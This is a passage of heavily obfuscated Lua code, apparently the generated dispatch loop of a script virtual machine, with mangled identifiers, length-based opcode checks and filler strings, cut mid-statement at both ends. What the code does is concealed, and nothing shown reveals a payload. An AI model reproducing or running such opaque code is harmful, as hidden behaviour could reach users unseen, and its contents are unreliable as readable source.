IllllIIlIIlll[#("kE")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("0DD")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("V6")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Rhg")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("tQRB")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("6n")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("OfY")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("QT")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{260;869;34;96};"1 + 1 = 111";"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("oIYW")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("zD")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("5Xv")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("mp")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("tMh")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("eq")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("4Tz")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{{997;711;374;365};{744;86;464;914};"1 + 1 = 111";"1 + 1 = 111";}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Ky")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Kvo")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("K0d1")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("lV")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("szm")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("MaaF")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{910;612;865;840};{815;134;839;281};}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("baH")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("GISP")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{180;186;26;611};}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("9bt")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Wn69")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("Fi")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("CHB")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("QT")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{150;5;526;667};{586;659;900;942};}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("UX")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("jWX")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("N9rA")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("7X")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("uRE")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("CU")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("TDZ")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("8m")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("1gT")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("va")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("vSA")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("FL")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("pgK")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("3jDT")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("s8s")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Xj")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sse")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{{482;121;155;112};"1 + 1 = 111";"1 + 1 = 111";{97;60;438;736};}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ic")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("KVI")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("n4")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("L8z")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("9G")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("GJH")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("AcPN")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("6t")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("mbs")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("tQlP")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("uM")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("YbU")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("QZj1")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("RT")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("H0n")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("18NM")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{589;993;480;386};}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";{374;879;801;948};}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("LINP")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("1r")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("zgP")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Z9")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("ylS")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("DHrB")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Uq")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";{955;66;329;456};}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{925;822;623;341};{94;480;923;994};"1 + 1 = 111";}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("U6")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("sgz")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("UJsN")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("6Z")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Kde")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("7XML")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("so")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Q7J")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("eaLD")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("l8")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Jmf")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("SGbu")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("PA")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("IEt")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("1zao")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Pk")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{{553;362;174;499};{237;983;600;707};{333;591;690;787};}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("WyVK")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("FS")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("3gi")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("kq")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";{421;368;229;174};}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("VhVv")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("2q")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("nxJ")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("oy")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("BGE")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Wp")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("BPQ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("sQ9v")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("yl")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Hz1")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("X5bj")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("0y")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("g8I")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("C5Zo")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("0y")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{558;775;105;436};{536;29;368;461};"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("13xS")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ju")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("l9X")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("uJdS")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("2m")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("4d7")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("dj")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("j8c")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Jp")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("OPs")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Kccj")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("rJ")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#{{988;519;304;110};"1 + 1 = 111";"1 + 1 = 111";}];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("re")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("vE1")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ae")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("p74")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("6A")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("OTR")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Bq")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("cro")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("7op6")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sZ")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("Tan")]];else ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("lO")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Rmr")]][ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("bGQN")]]];end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("2xUcsEudfMTnG4FGoc1z1uKryVfTrtilBGzHSXxtvZT8NfGJKdQRICxHWCOHyLWVDIX")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("G7XCPHdcLLOspGjnNCN8i1Vpi05Ud7GfsGdNqobazu5lYur1CIia4Y0")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("mHsZLt9OfJaTDG7zANKY5JCXJerFZFkEQyAT5mzeurfouIy5L")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("KrocTNfFqHcFZKyHdegnDnnFDNEmDaQv3e53oNOXOA61c0")then if ajefa_IIIlIllIllllIIllIlllIIll==#("F1YEtZxqxdTJgj2cp1QLUPFrAAtKcqxDMk8vPHxGHYJZF")then do return end;else ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("xb")]]=ajefa_lIIIllIlIIIIIllIlII(ajefa_lllIlllllIIlI[ajefa_lllIIlIllIlIllllIIlIIlll[#("vPH")]],nil,ajefa_IlIIllIIIl);end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#{"1 + 1 = 111";"1 + 1 = 111";{336;242;195;500};"1 + 1 = 111";{248;588;471;447};{403;614;563;835};"1 + 1 = 111";"1 + 1 = 111";{16;222;388;552};{471;40;238;193};"1 + 1 = 111";"1 + 1 = 111";{813;709;495;834};{416;250;509;207};"1 + 1 = 111";{298;349;366;554};"1 + 1 = 111";{314;339;520;213};{950;212;601;829};"1 + 1 = 111";{603;713;987;746};{377;535;840;766};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{660;550;3;889};"1 + 1 = 111";"1 + 1 = 111";{186;881;291;43};{528;204;705;331};{436;306;439;63};{287;257;959;157};{980;591;228;220};"1 + 1 = 111";{435;697;508;421};{81;405;92;370};{519;740;128;571};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{622;176;386;796};"1 + 1 = 111";"1 + 1 = 111";}then 